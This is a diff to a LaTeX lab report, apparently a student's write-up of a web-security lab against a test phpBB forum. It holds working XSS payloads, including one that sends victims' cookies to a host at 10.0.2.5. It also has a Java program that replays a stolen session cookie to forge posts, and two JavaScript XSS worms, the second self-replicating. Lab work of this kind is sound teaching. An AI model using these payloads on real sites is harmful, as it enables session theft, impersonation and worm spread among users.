@@ -20,6 +20,25 @@
 \newcommand{\ts}{\textsuperscript}
 % \usepackage{url}
 
+\definecolor{lightgray}{rgb}{.9,.9,.9}
+\definecolor{darkgray}{rgb}{.4,.4,.4}
+\definecolor{purple}{rgb}{0.65, 0.12, 0.82}
+
+\lstdefinelanguage{JavaScript}{
+  keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},
+  keywordstyle=\color{blue}\bfseries,
+  ndkeywords={class, export, boolean, throw, implements, import, this},
+  ndkeywordstyle=\color{darkgray}\bfseries,
+  identifierstyle=\color{black},
+  sensitive=false,
+  comment=[l]{//},
+  morecomment=[s]{/*}{*/},
+  commentstyle=\color{purple}\ttfamily,
+  stringstyle=\color{red}\ttfamily,
+  morestring=[b]',
+  morestring=[b]"
+}
+
 \begin{document}
 % \pagenumbering{gobble}% Remove page numbers
 
@@ -215,10 +234,44 @@ __END_OF_PROGRAM__
 
 \section{Cross-side scripting (XSS) attacks}
 
+\subsection{Posting a Malicious Message to Display an Alert Window}
+We succeeded in invoking the warning message with the following code:\\
+\begin{center}\texttt{<script>alert('Vulnerable!');</script>}\end{center}
+\includegraphics[width=.95\textwidth]{gfx/xss/task1.png}
+
+\subsection{Posting a Malicious Message to Display Cookies}
+We succeeded in displaying personal cookies with the following code:\\
+\begin{center}\texttt{<script>alert(document.cookie);</script>\\Hello Everybody,\\Welcome to this message board.}\end{center}
+
+\includegraphics[width=.95\textwidth]{gfx/xss/task2.png}
+
+\subsection{Stealing Cookies from the Victim's Machine}
+Using \texttt{echoserv} program on one of the machines in the same local network as the www server we were able to capture the cookie of a person viewing malicious post:\\
+
+\begin{center}\texttt{Hello Folks,\\<script>document.write('<img src=http://10.0.2.5:5555?c='+ escape(document.cookie) + '   >'); </script>\\This script is to test XSS. Thanks.}\end{center}
+
+\includegraphics[width=.95\textwidth]{gfx/xss/task3-alice.png}\\[1cm]
+
+\includegraphics[width=.95\textwidth]{gfx/xss/task3-alice-cookie-stolen.png}
+
+\subsection{Impersonating the Victim using the Stolen Cookies}
+We wrote a \texttt{Java} program which uses stolen cookie to post messages on behalf of cookie owner. The source code is available in \emph{appendix}~\ref{app:java}.\\
+
+\includegraphics[width=.95\textwidth]{gfx/xss/task4-attack-done.png}\\[1cm]
+
+\includegraphics[width=.95\textwidth]{gfx/xss/task4-inspecting-headers.png}\\[1cm]
+
+\includegraphics[width=.95\textwidth]{gfx/xss/task4-see-headers.png}
+
 \subsection{Writing an XSS Worm}
+We managed to append XSS worm to message on the forum forging posts on behalf of current logged-in user. The \texttt{JavaScript} source code is available in \emph{appendix}~\ref{app:javasc1}.\\
 
-After refreshing multiple times, the response contains an error message "You cannot make another post so soon after your last; please try again in a short while." which is a mechanism in phpBB from preventing flooding message boards.
+We also noticed that after refreshing multiple times, the response contains an error message: ``You cannot make another post so soon after your last; please try again in a short while.'' which is a mechanism in phpBB to prevent flooding message boards.
 
+\includegraphics[width=.95\textwidth]{gfx/xss/task5-worm-working}
+
+\subsection{Writing a Self-Propagating XSS Worm}
+We also successfully modified the worm in a way that posted message contains the the worm itself. The souce code is available in \emph{appendix}~\ref{app:javasc2}.
 
 \section{SQL injection attack}
 
@@ -481,6 +534,230 @@ sudo $ATT $ARP_TOOL -d $INT -b $VICTIM_MAC -g $GATEWAY -h $VICTIM_MAC -i $ATTACK
 echo "Unknown option"
 esac
 
+\end{lstlisting}
+
+\section{Java application for forging message with cookie.\label{app:java}}
+
+\lstset{
+  captionpos=b,
+  frame=single,
+  language=Java,
+  breaklines=true,
+  caption="Java application for forging message with cookie.",
+  label=parta:script
+}
+\begin{lstlisting}
+import java.io.*;
+import java.net.*;
+public class HTTPSimpleForge {
+
+  public static void main(String[] args) throws IOException {
+
+    try {
+      int responseCode;
+      InputStream responseIn=null;
+
+      // URL to be forged.
+      URL url = new URL ("http://www.xsslabphpbb.com/posting.php");
+      
+      // URLConnection instance is created to further parameterize a
+      // resource request past what the state members of URL instance
+      // can represent.
+      URLConnection urlConn = url.openConnection();
+      if (urlConn instanceof HttpURLConnection) {
+        urlConn.setConnectTimeout(60000);
+        urlConn.setReadTimeout(90000);
+      }
+
+      // addRequestProperty method is used to add HTTP Header Information.
+      // Here we add User-Agent HTTP header to the forged HTTP packet.
+      urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
+      urlConn.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+      
+      String stolenCookie = "phpbb2mysql_t%3Da%253A5%253A%257Bi%253A1%253Bi%253A1418225227%253Bi%253A2%253Bi%253A1418223204%253Bi%253A5%253Bi%253A1418223252%253Bi%253A6%253Bi%253A1418223310%253Bi%253A7%253Bi%253A1418225234%253B%257D%3B%20phpbb2mysql_data%3Da%253A2%253A%257Bs%253A11%253A%2522autologinid%2522%253Bs%253A0%253A%2522%2522%253Bs%253A6%253A%2522userid%2522%253Bs%253A1%253A%25224%2522%253B%257D%3B%20phpbb2mysql_sid%3D642b0037b1b4f81a4141e8fb505e50f6";
+
+
+      String decodedCookie = URLDecoder.decode(stolenCookie); 
+        
+      System.out.println(decodedCookie);
+
+      urlConn.addRequestProperty("Cookie", decodedCookie);
+      //HTTP Post Data which includes the information to be sent to the server.
+      String data="subject=AYBABTU&message=AllYourBaseAreBelongToUs&mode=reply&sid=642b0037b1b4f81a4141e8fb505e50f6&t=1&post=Submit";
+
+      // DoOutput flag of URL Connection should be set to true
+      // to send HTTP POST message.
+      urlConn.setDoOutput(true);
+
+      // OutputStreamWriter is used to write the HTTP POST data
+      // to the url connection.
+      OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
+      wr.write(data);
+      wr.flush();
+
+      // HttpURLConnection a subclass of URLConnection is returned by
+      // url.openConnection() since the url is an http request.
+      if (urlConn instanceof HttpURLConnection) {
+
+             HttpURLConnection httpConn = (HttpURLConnection) urlConn;
+             // Contacts the web server and gets the status code from
+             // HTTP Response message.
+             responseCode = httpConn.getResponseCode();
+             System.out.println("Response Code = " + responseCode);
+             // HTTP status code HTTP_OK means the response was
+             // received sucessfully.
+             if (responseCode == HttpURLConnection.HTTP_OK) {
+                     // Get the input stream from url connection object.
+                     responseIn = urlConn.getInputStream();
+                     // Create an instance for BufferedReader
+                     // to read the response line by line.
+                     BufferedReader buf_inp = new BufferedReader(
+                                     new InputStreamReader(responseIn));
+                     String inputLine;
+                     while((inputLine = buf_inp.readLine())!=null) {
+                             System.out.println(inputLine);
+                     }
+             }
+      }
+    } catch (MalformedURLException e) {
+               e.printStackTrace();
+    }
+  }
+}
+
+\end{lstlisting}
+
+
+\section{JavaScript for forging message.\label{app:javasc1}}
+
+\lstset{
+  captionpos=b,
+  frame=single,
+  language=JavaScript,
+  breaklines=true,
+  caption="JavaScript for forging message.",
+  label=parta:script
+}
+\begin{lstlisting}
+<script>
+var Ajax=null;
+// Construct the header information for the Http request
+Ajax=new XMLHttpRequest();
+Ajax.open("POST","http://www.xsslabphpbb.com/posting.php",true);
+Ajax.setRequestHeader("Host","www.xsslabphpbb.com");
+Ajax.setRequestHeader("Keep-Alive","300");
+Ajax.setRequestHeader("Connection","keep-alive");
+Ajax.setRequestHeader("Cookie",document.cookie);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+
+// Steal cookie
+var valueSearched = "phpbb2mysql_sid=";
+
+// Find where mysql sid is 
+var indexOfSid = document.cookie.indexOf(valueSearched);
+
+// Move the string behind mysql_sid=
+indexOfSid += valueSearched.length;
+
+// Check if there is a semicolon at the end, we only want one parameter from cookie
+var semicolonIndex = document.cookie.indexOf(";", indexOfSid);
+
+var stolenCookie = "";
+
+if(semicolonIndex == -1) {
+  stolenCookie = document.cookie.slice(indexOfSid);
+} else {
+  stolenCookie = document.cookie.slice(indexOfSid, semicolonIndex);
+}
+
+// Construct the content. The format of the content can be learned
+// from LiveHttpHeader. All we need to fill is subject, message, and sid.
+var content="subject=XSSWorm"; // You need to fill in the details.
+
+// Add message body
+content += "&message=Attack";
+
+// Choose topic number
+content += "&t=8";
+
+// Add session id stolen from cookie
+content += "&sid=" + stolenCookie; // e.g. 642b0037b1b4f81a4141e8fb505e50f6
+
+// Specify posting mode
+content += "&mode=reply";
+content += "&post=Submit";
+// Send the HTTP POST request.
+Ajax.send(content);
+</script>
+\end{lstlisting}
+
+\section{Self-replicating JavaScript for forging message.\label{app:javasc2}}
+
+\lstset{
+  captionpos=b,
+  frame=single,
+  language=JavaScript,
+  breaklines=true,
+  caption="Self-replicating JavaScript for forging message.",
+  label=parta:script
+}
+\begin{lstlisting}
+<script id=worm>
+var Ajax=null;
+// Construct the header information for the Http request
+Ajax=new XMLHttpRequest();
+Ajax.open("POST","http://www.xsslabphpbb.com/posting.php",true);
+Ajax.setRequestHeader("Host","www.xsslabphpbb.com");
+Ajax.setRequestHeader("Keep-Alive","300");
+Ajax.setRequestHeader("Connection","keep-alive");
+Ajax.setRequestHeader("Cookie",document.cookie);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+
+// Steal cookie
+var valueSearched = "phpbb2mysql_sid=";
+
+// Find where mysql sid is 
+var indexOfSid = document.cookie.indexOf(valueSearched);
+
+// Move the string behind mysql_sid=
+indexOfSid = indexOfSid - (-valueSearched.length);
+
+// Check if there is a semicolon at the end, we only want one parameter from cookie
+var semicolonIndex = document.cookie.indexOf(";", indexOfSid);
+
+var stolenCookie = "";
+
+if(semicolonIndex == -1) {
+  stolenCookie = document.cookie.slice(indexOfSid);
+} else {
+  stolenCookie = document.cookie.slice(indexOfSid, semicolonIndex);
+}
+
+// Construct the content. The format of the content can be learned
+// from LiveHttpHeader. All we need to fill is subject, message, and sid.
+var content="subject=XSSWorm"; // You need to fill in the details.
+
+// Add message body
+content = content.concat("&message=Attack");
+
+  var strCode = document.getElementById("worm");
+  var beg = "%3Cscript id=worm%3E";
+  var end = "%3C/script%3E";
+  var urlEncSample = beg.concat( escape(strCode.innerHTML), end);
+  content = content.concat(urlEncSample);
+
+// Choose topic number
+content = content.concat("&t=8");
+
+// Add session id stolen from cookie
+content = content.concat("&sid=", stolenCookie); // e.g. 642b0037b1b4f81a4141e8fb505e50f6
+
+// Specify posting mode
+content = content.concat("&mode=reply");
+content = content.concat("&post=Submit");
+// Send the HTTP POST request.
+Ajax.send(content);
+</script>
 \end{lstlisting}
 
 
